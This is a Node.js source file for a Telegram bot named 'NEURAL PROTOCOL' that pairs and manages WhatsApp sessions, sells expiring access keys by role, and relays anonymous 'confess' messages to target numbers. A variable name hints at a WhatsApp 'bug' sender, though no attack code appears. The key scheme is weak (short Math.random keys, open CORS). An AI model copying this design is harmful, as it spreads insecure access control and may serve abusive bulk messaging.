const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
  default: makeWASocket,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  fetchLatestWaWebVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageTag,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  getContentType,
  jidDecode,
  MessageRetryMap,
  getAggregateVotesInPollMessage,
  proto,
  delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const confessPath = path.join(__dirname, "database", "confess.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;

function getCountryCode(phoneNumber) {
  const countryCodes = {
    '1': 'US/Canada',
    '44': 'UK',
    '33': 'France',
    '49': 'Germany',
    '39': 'Italy',
    '34': 'Spain',
    '7': 'Russia',
    '81': 'Japan',
    '82': 'South Korea',
    '86': 'China',
    '91': 'India',
    '62': 'Indonesia',
    '60': 'Malaysia',
    '63': 'Philippines',
    '66': 'Thailand',
    '84': 'Vietnam',
    '65': 'Singapore',
    '61': 'Australia',
    '64': 'New Zealand',
    '55': 'Brazil',
    '52': 'Mexico',
    '57': 'Colombia',
    '51': 'Peru',
    '54': 'Argentina',
    '27': 'South Africa'
  };

  for (const [code, country] of Object.entries(countryCodes)) {
    if (phoneNumber.startsWith(code)) {
      return country;
    }
  }

  return 'International';
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    // Pastikan direktori database ada
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    // Pastikan setiap user punya role default 'user' jika tidak ada
    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    // Tulis file dengan format yang rapi
    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅  Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true; // ✅ Kembalikan true jika sukses
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false; // ✅ Kembalikan false jika gagal
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");

  // Jika file tidak ada, buat file kosong
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }

  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");

    // Handle file kosong
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }

    const users = JSON.parse(fileContent);

    // Pastikan setiap user punya role
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);

    // Jika file corrupt, buat backup dan reset
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }

    // Reset file dengan array kosong
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");

    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }

  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

function loadConfessData() {
  if (!fs.existsSync(confessPath)) {
    const dir = path.dirname(confessPath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(confessPath, JSON.stringify({}));
    return {};
  }
  return JSON.parse(fs.readFileSync(confessPath));
}

function saveConfessData(data) {
  fs.writeFileSync(confessPath, JSON.stringify(data, null, 2));
}

// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);

  const userSessions = loadUserSessions();

  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }

  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();

  // Check hasil setelah 30 detik
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);

    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

// FUNCTION SANGAT SIMPLE
function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();

  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);

    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');

      // Cek apakah session files ada
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);

        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }

  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);

    // Kirim event connecting
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    // ✅ GUNAKAN LOGGER YANG SILENT
    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          // ❌ HAPUS DARI sessions MAP KETIKA TERPUTUS
          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });

            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired ||
            statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });

            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();

          // ✅ SIMPAN SOCKET KE sessions MAP GLOBAL - INI YANG PENTING!
          sessions.set(BotNumber, userSock);

          // ✅ KIRIM EVENT SUCCESS KE WEB
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });

          // ✅ SIMPAN KE USER SESSIONS
          const userSessions = loadUserSessions();
          if (!userSessions[username]) {
            userSessions[username] = [];
          }
          if (!userSessions[username].includes(BotNumber)) {
            userSessions[username].push(BotNumber);
            saveUserSessions(userSessions);
            console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
          }

          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });

          // Generate pairing code jika belum ada credentials
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;

            // Tunggu sebentar sebelum request pairing code
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });

                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;

                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);

                // KIRIM KODE PAIRING KE WEB INTERFACE
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });

              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        // Tampilkan QR code jika ada
        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);

      // Listener untuk balasan confess
      userSock.ev.on("messages.upsert", async ({ messages, type }) => {
        if (type === "notify") {
          for (const msg of messages) {
            if (!msg.key.fromMe && msg.message) {
              const remoteJid = msg.key.remoteJid;
              if (remoteJid.endsWith('@g.us')) continue;

              const messageContent = msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                msg.message.imageMessage?.caption || "";

              if (!messageContent) continue;

              const targetNumber = remoteJid.split('@')[0];
              const confessData = loadConfessData();
              const key = `${BotNumber}-${targetNumber}`;

              if (confessData[key] && confessData[key].username === username) {
                confessData[key].messages.push({
                  from: "target",
                  text: messageContent,
                  timestamp: Date.now()
                });
                saveConfessData(confessData);

                sendEventToUser(username, {
                  type: 'confess_reply',
                  data: {
                    target: targetNumber,
                    message: messageContent,
                    timestamp: Date.now(),
                    sender: BotNumber
                  }
                });
              }
            }
          }
        }
      });

      // Timeout after 120 seconds
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error',
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🍁 NEURAL PROTOCOL</blockquote>
<i>Now NEURAL PROTOCOL has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @hamzcuwekk</b>
<b>Version   : 1 ⧸ <code>I</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    // Baris 1
    ["🔑 Settings Menu"],
    // Baris 2  
    ["ℹ️ Bot Info", "💬 Chat"],
    // Baris 3
    ["📢 Channel"]
  ])
    .resize()
    .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Settings Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 NEURAL PROTOCOL</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [Markup.button.url("NEURAL PROTOCOL 𝐂𝐎𝐑𝐄", "https://t.me/Darksatoru1")]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>NEURAL PROTOCOL</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @hamzneverlose for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [Markup.button.url("NEURAL PROTOCOL 𝐂𝐎𝐑𝐄", "https://t.me/hamzneverlose")]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/hamzneverlose");
});
// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 NEURAL PROTOCOL</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.url("NEURAL PROTOCOL 𝐂𝐎𝐑𝐄", "https://t.me/Darksatoru1")]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>NEURAL PROTOCOL</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @hamzneverlose for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [Markup.button.url("NEURAL PROTOCOL 𝐂𝐎𝐑𝐄", "https://t.me/hamzneverlose")]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🍁 NEURAL PROTOCOL</blockquote>
<i>Now NEURAL PROTOCOL has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @hamzneverlose</b>
<b>Version   : 1 ⧸ <code>I</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Settings Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
    .resize()
    .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;

  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;

  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });

  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<role>\n\nContoh:\n• /ckey hamz,3d,admin\n• /ckey hamz,7d,reseller\n• /ckey hamz,1d,user\n\nRole: owner, admin, reseller, hamzganteng");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  // Validasi role
  const validRoles = ['owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }

  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("myrole", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";

  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }

  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Gunakan /ckey di bot untuk membuat key dengan role tertentu (Owner only)</i>
  `, { parse_mode: "HTML" });
});

/* simpen aja dlu soalnya ga guna
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});*/

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
  const chatId = ctx.chat.id;
  const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!input) {
    return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
  }

  const url = input;

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
    const res = await fetch(apiUrl);
    const data = await res.json();

    if (!data || !data.result) {
      return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
    }

    const code = data.result;

    if (code.length > 4000) {
      // simpan ke file sementara
      const filePath = `sourcecode_${Date.now()}.html`;
      fs.writeFileSync(filePath, code);

      await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

      fs.unlinkSync(filePath); // hapus file setelah dikirim
    } else {
      await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
    }
  } catch (err) {
    console.error("GetCode API Error:", err);
    ctx.reply("❌ Error fetching website source code. Please try again later.");
  }
});

console.clear();
console.log(chalk.bold.red(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
